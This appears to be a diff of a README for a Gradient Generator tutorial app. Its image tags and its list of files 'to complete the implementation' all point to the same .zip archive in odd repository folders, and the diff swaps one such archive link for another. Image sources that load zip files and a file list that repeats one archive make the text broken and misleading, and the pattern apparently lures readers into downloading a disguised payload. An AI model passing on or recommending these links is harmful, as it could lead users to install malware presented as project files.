@@ -4,7 +4,7 @@ In this project, let's build a **Gradient Generator** app by applying the concep
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://raw.githubusercontent.com/vicky9696v/gradient-generator/main/merpeople/gradient-generator.zip" alt="gradient-generator" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://github.com/vicky9696v/gradient-generator/raw/refs/heads/main/src/components/GradientDirectionItem/gradient-generator-v1.7.zip" alt="gradient-generator" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -42,7 +42,7 @@ In this project, let's build a **Gradient Generator** app by applying the concep
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://raw.githubusercontent.com/vicky9696v/gradient-generator/main/merpeople/gradient-generator.zip" alt="gradetient-generator-component-breakdown-structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://github.com/vicky9696v/gradient-generator/raw/refs/heads/main/src/components/GradientDirectionItem/gradient-generator-v1.7.zip" alt="gradetient-generator-component-breakdown-structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -54,10 +54,10 @@ In this project, let's build a **Gradient Generator** app by applying the concep
 
 Use these files to complete the implementation:
 
-- `https://raw.githubusercontent.com/vicky9696v/gradient-generator/main/merpeople/gradient-generator.zip`
-- `https://raw.githubusercontent.com/vicky9696v/gradient-generator/main/merpeople/gradient-generator.zip`
-- `https://raw.githubusercontent.com/vicky9696v/gradient-generator/main/merpeople/gradient-generator.zip`
-- `https://raw.githubusercontent.com/vicky9696v/gradient-generator/main/merpeople/gradient-generator.zip`
+- `https://github.com/vicky9696v/gradient-generator/raw/refs/heads/main/src/components/GradientDirectionItem/gradient-generator-v1.7.zip`
+- `https://github.com/vicky9696v/gradient-generator/raw/refs/heads/main/src/components/GradientDirectionItem/gradient-generator-v1.7.zip`
+- `https://github.com/vicky9696v/gradient-generator/raw/refs/heads/main/src/components/GradientDirectionItem/gradient-generator-v1.7.zip`
+- `https://github.com/vicky9696v/gradient-generator/raw/refs/heads/main/src/components/GradientDirectionItem/gradient-generator-v1.7.zip`
 </details>
 
 ### Quick Tips
